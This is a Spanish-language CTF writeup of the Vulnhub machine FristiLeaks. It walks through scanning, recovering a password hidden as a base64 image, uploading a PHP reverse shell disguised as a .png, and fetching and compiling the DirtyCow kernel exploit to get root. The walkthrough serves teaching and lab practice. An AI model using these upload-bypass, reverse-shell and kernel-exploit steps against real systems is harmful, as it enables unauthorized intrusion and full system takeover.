---
title: "Writeup Fristileaks"
header:
  image: /assets/images/posts/fristileaks/featured_image_fristileaks.jpg
  teaser: /assets/images/posts/fristileaks/featured_image_fristileaks.jpg
excerpt_separator: "<!--more-->"
show_date: true
toc: true
toc_sticky: true
share: true
related: true
categories:
  - writeups
  - Vulnhub
tags:
  - Burp Suite
  - Reverse Shell
  - gobuster
  - zsteg
  - dirb
  - hydra
  - cewl
collection: writeups
featured: yes
---

En este writeup, resolveré la máquina **Fristileaks** de **Vulnhub**, documentando cada paso y técnica empleada durante el proceso. A lo largo de este análisis, cubriré desde la recolección de información inicial hasta la explotación de vulnerabilidades y la escalada de privilegios, detallando las herramientas utilizadas y los métodos aplicados.

El objetivo es proporcionar una guía detallada para aquellos interesados en aprender sobre técnicas de pentesting y hacking ético, a través de un enfoque práctico y exhaustivo. Cada etapa del proceso será explicada en detalle para facilitar la comprensión de los desafíos encontrados y las soluciones implementadas. Este writeup está diseñado tanto para novatos como para usuarios avanzados que deseen mejorar sus habilidades en la resolución de máquinas de CTF.


                  _____     _     _   _ _            _        
                 |  ___| __(_)___| |_(_) | ___  __ _| | _____ 
                 | |_ | '__| / __| __| | |/ _ \/ _` | |/ / __|
                 |  _|| |  | \__ \ |_| | |  __/ (_| |   <\__ \
                 |_|  |_|  |_|___/\__|_|_|\___|\__,_|_|\_\___/


| **Name:**         | FristiLeaks: 1.3                           |
| ----------------- | ------------------------------------------ |
| **Date release**: | 14 Dec 2015                                |
| **Author:**       | Ar0xA                                      |
| **Series:**       | FristiLeaks                                |
| **Style**:        | Enumeration/Follow the breadcrumbs         |
| **Goal**:         | get root (uid 0) and read the flag file    |
| **Difficulty**:   | Basic                                      |
| **Web page:**     | https://tldr.nu/2015/12/15/fristileaks-vm/ |

## Descripción

A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..
VMware users will need to manually edit the VM's MAC address to: 08:00:27:A5:A6:76 [080027A5A676]

Filename: FristiLeaks_1.3.ova
File size: 668 MB
MD5: 206C9D1C0F29248CB3EC1873A56E4940
SHA1: 4AB71D307E6D9AA3CEFE7547DDC1F987D738C596

## Resolucion de la maquina

![alt text](/assets/images/fristileaks/image-5.png)

## Fase de Fingerprinting / Reconocimiento (Reconnaissance): 

### Descubrimiento de IP objetivo en la red

Aunque la maquina nos da una IP en la pantalla de acceso realizo un descubrimiento para no dar por hecho nada.

```bash
sudo netdiscover -r 10.0.2.0/24 -i eth0
```

![alt text](/assets/images/fristileaks/image-4.png)

Obtengo que la IP de la maquina es 10.0.2.7 que coincide con la IP que nos ofrece la maquina en su consola de acceso.

![alt text](/assets/images/fristileaks/image-6.png)

### Descubrimiento de puertos y servicios en el host objetivo

Lanzo el siguiente comando:

```
sudo nmap -sS -sC -sV -O 10.0.2.7  
```

- **`-sS`**: **escaneo SYN**. Envía un paquete SYN al puerto de destino y espera una respuesta. Si se recibe un SYN/ACK, el puerto se considera abierto; si se recibe un RST/ACK, el puerto se considera cerrado.

- **`-sC`**: Esta opción habilita el escaneo de scripts predeterminados de Nmap, como detectar versiones de servicios, identificar vulnerabilidades o recopilar más información sobre el objetivo.

- **`-sV`**: Esta opción indica a Nmap que realice detección de versiones. La detección de versiones implica consultar los puertos abiertos del objetivo para determinar qué servicios y versiones están ejecutándose en esos puertos.

- **`-O`**: Esta opción habilita la detección de sistemas operativos (OS). Nmap intenta determinar el sistema operativo del objetivo mediante el análisis de diversos parámetros.

Como resultado obtengo:

```   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 19:14 EDT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.0.2.7
Host is up (0.00025s latency).
Not shown: 987 filtered tcp ports (no-response), 12 filtered tcp ports (host-prohibited)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|media device|webcam                    
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (97%), Drobo embedded (89%), Synology DiskStation Manager 5.X (89%), LG embedded (88%), Tandberg embedded (88%)      
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/h:drobo:5n cpe:/a:synology:diskstation_manager:5.2             
Aggressive OS guesses: Linux 2.6.32 - 3.10 (97%), Linux 2.6.32 - 3.13 (97%), Linux 2.6.39 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.2 (91%), Linux 3.2 - 3.16 (91%), Linux 3.2 - 3.8 (91%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%)                                                                       
No exact OS matches for host (test conditions non-ideal).                        
Network Distance: 1 hop                                                          
                                                                                 
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                             
Nmap done: 1 IP address (1 host up) scanned in 22.88 seconds  
```

Descubro el puerto 80 expuesto del cual me indica que corre un servidor apache.

Ademas me indica que aparece un robots.txt y que contiene 3 entradas deshabilitadas ``` /cola /sisi /beer ``` 


| PORT   | STATE | SERVICE | VERSION                                        |
| ------ | ----- | ------- | ---------------------------------------------- |
| 80/tcp | open  | http    | Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3) |

## Fase de Footprinting / Exploración (Scanning):

### Exploracion puerto 80

#### Herramienta nuclei

Lanzo el comando

```
nuclei -u http://10.0.2.7
```

Obtengo el resultado:

```
[INF] Current nuclei version: v3.2.6 (outdated)
[INF] Current nuclei-templates version: v9.8.6 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 65
[INF] Templates loaded for current scan: 7957
[INF] Executing 7957 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1483 (Reduced 1402 Requests)
[http-trace:trace-request] [http] [info] http://10.0.2.7
[http-trace:options-request] [http] [info] http://10.0.2.7
[INF] Using Interactsh Server: oast.online
[options-method] [http] [info] http://10.0.2.7 ["GET,HEAD,POST,OPTIONS,TRACE"]
[apache-detect] [http] [info] http://10.0.2.7 ["Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3"]
[php-detect] [http] [info] http://10.0.2.7
[http-missing-security-headers:content-security-policy] [http] [info] http://10.0.2.7
```

#### nikto

Lanzo nikto para comprobar las posibles vulnerabilidades de la web alojada en la maquina

```
nikto -h 10.0.2.7
```

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.7
+ Target Hostname:    10.0.2.7
+ Target Port:        80
+ Start Time:         2024-05-14 18:39:24 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ /: Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /robots.txt: Entry '/cola/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/sisi/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/beer/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 3 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ PHP/5.3.3 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ PHP/5.3 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8911 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2024-05-14 18:39:43 (GMT-4) (19 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

#### Exploracion pasiva

Abro un navegador para ver la web que nos ofrece la maquina en el puerto 80

![alt text](/assets/images/fristileaks/image-7.png)

Miro su código:

![alt text](/assets/images/fristileaks/image-8.png)

Tomo nota del pie de web que indica que los Fristileaks son:

```bash
@meneer, @barrebas, @rikvduijn, @wez3forsec, @PyroBatNL, @0xDUDE, @annejanbrouwer, @Sander2121, Reinierk, @DearCharles, @miamat, MisterXE, BasB, Dwight, Egeltje, @pdersjant, @tcp130x10, @spierenburg, @ielmatani, @renepieters, Mystery guest, @EQ_uinix, @WhatSecurity, @mramsmeets, @Ar0xA
```




### Explotacion

#### Explotacion de puerto 80


Tras varios intentos de comprobar directorios se me ocurre poner el nombre de la maquina como directorio `http://10.0.2.7/fristi/` y obtengo una pagina con un login:

![alt text](/assets/images/fristileaks/image-9.png)

Compruebo su codigo de nuevo:

![alt text](/assets/images/fristileaks/image-10.png)

Obtengo diferentes indicaciones o anotaciones aparentemente dejadas por el desarrollador.

```
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
```

El mensaje indica **"Necesitamos limpiar esto para la producción. Dejé algo de basura aquí para facilitar las pruebas."** y lo firma **eezeepz** 

Tambien veo que al principio de la web en el meta description hay un contenido: 

```
"super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it."
```

Página de prueba de inicio de sesión de contraseña de Super Leet. Usamos codificación base64 para las imágenes para que estén integradas en el HTML. Leí en algún lugar de la web que es una buena forma de hacerlo.

Tambien veo que al final de la web aparece un codigo comentado.

```
<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
```

Ya que en el codigo se habla de base64 y viendo el formato voy a pasarlo por un decodificador para poder ver que hay detras de esta codificación.

Abro CiberChef y le doy como Recipe FROM Base64

![alt text](/assets/images/fristileaks/upload_01a0f72bed2a5fdb6dd5936da14117c2.png) 

El resultado parece ser un fichero PNG, le doy a guardar y obtengo un fichero de tipo .png

al abrirlo tengo 

![alt text](/assets/images/fristileaks/upload_9810d8d36a93a26a82007efe68953d9e.png)

eezeepz puede ser usuario ya que firmaba un mensaje y los caracteres de la imagen puede ser una clave. 

Lo pruebo en el login.

![alt text](/assets/images/fristileaks/upload_47ae8225f775079fb640589365a22156.png)

Y consigo acceder e iniciar sesion.

![alt text](/assets/images/fristileaks/upload_3d6c04e230de712fe46a97d9842ac96d.png)

Una vez iniciado sesión vemos que podemos subir archivos .jpg , .png , .gif.

Puedo usar la opcion de subir archivos para intentar añadir un fichero con una reverse shell que al ejecutarse en el servidor nos abra una conexion a nuestro equipo.

Para ello, ya que la maquina ejecuta un servidor apache que puede interpretar php buso una reverse shell en php que pueda descargarme para usarla en el objetivo.

Accedo a https://github.com/pentestmonkey/php-reverse-shell

![alt text](/assets/images/fristileaks/image-11.png)

Realizamos la descarga del codigo:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

![alt text](/assets/images/fristileaks/image-12.png)

Configuro para que cuando se ejecute abra una conexion contra mi maquina kali

![alt text](/assets/images/fristileaks/image-13.png)

Para ello dejo a la escucha mi maquina kali mediante el comando

```bash
nc -nlvp 4444
```

En la maquina objetivo solo nos deja subir archivos de tipo imagen

![alt text](/assets/images/fristileaks/image-15.png)

Asi que cambio la extension del reverse shell dejando el archivo php-reverse-shell.php.png

![alt text](/assets/images/fristileaks/image-14.png)

Subimos el archivo y una vez subido hacemos una navegacion hacia el archivo, 

![alt text](/assets/images/fristileaks/image-16.png)

lo que provocara que en la maquina kali se nos abra una Shell de la maquina objetivo.

![alt text](/assets/images/fristileaks/image-17.png)

Una vez obtenida para tener una shell completa hacemos estos pasos:

```bash
script /dev/null -c bash
Pulso CTRL + Z para dejar la zsh suspendida
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash

```
![alt text](/assets/images/fristileaks/image-19.png)

## Elevacion de privilegios

Compruebo la version de linux que ejecuta la maquina objetivo con el comando `uname -a`

![alt text](/assets/images/fristileaks/image-20.png)

Obtengo que esta ejecutando un Linux 2.6.32...

![alt text](/assets/images/fristileaks/image.png)

Para realizar un ataque de kernel para obtener el root directamente busco en Google si existe un exploit para ello usando el termino de busqueda:  `site:exploit-db.com Kernel Linux 2.6`

![alt text](/assets/images/fristileaks/image-22.png)

Nos aparece un exploit que nos indica que genera una nueva linea en el fichero `/etc/passwd`

Tambien puedo hacer la busqueda en exploit-db directamente.

![alt text](/assets/images/fristileaks/image-21.png)

Una vez localizado un exploit, compruebo si lo tengo en mi maquina kali mediante el comando

```bash
searchsploit Linux Kernel 2.6
```

![alt text](/assets/images/fristileaks/image-23.png)

Y encuentro que tengo el mismo exploit que encontre en internet en mi maquina kali, asi que lo copio a mi carpeta de trabajo para poder trabajar con el si fuera necesario modificar algo.

![alt text](/assets/images/fristileaks/image-24.png)

El exploit esta realizado en C por lo que necesito compilarlo en la maquina objetivo y ejecutarlo desde ella. 

Para esto levanto un servidor en mi maquina kali con el comando:

```bash
python3 -m http.server 8080
```

![alt text](/assets/images/fristileaks/image-1.png)

y ahora desde la shell de la maquina objetivo me desplazo a una carpeta que tenga opciones de escritura, normalmente suele tenerlo tmp y lo descargo con el comando

```bash
wget 10.0.2.14:8080/40839.c
```

![alt text](/assets/images/fristileaks/image-2.png)

Ahora realizo la compilacion del exploit en la maquina objetivo con el comando:

```bash
gcc -pthread 40839.c -o dirty -lcrypt
```

Le damos permiso de ejecucion:

```bash
chmod +x dirty
```

Y ejecutamos el exploit con: `./dirty`

![alt text](/assets/images/fristileaks/image-3.png)

Me pide clave pero le pulso intro y nos crea el usuario firefart con permisos root

Tras un tiempo de procesamiento que parece que se queda bloqueado pero es solo en apariencia.

![alt text](/assets/images/fristileaks/image-25.png)

Al cabo de unos minutos, me da un el "DONE"

![alt text](/assets/images/fristileaks/image-26.png)

Compruebo y cambio de usuario al usuario firefart, sin clave ya que no pusimos ninguna clave

![alt text](/assets/images/fristileaks/image-27.png)

Busco ficheros txt desde el usuario firefart y encuentro un fichero que se llama fristileaks_secrets.txt que al ver su contenido obtenemos la flag.

![alt text](/assets/images/fristileaks/image-28.png)
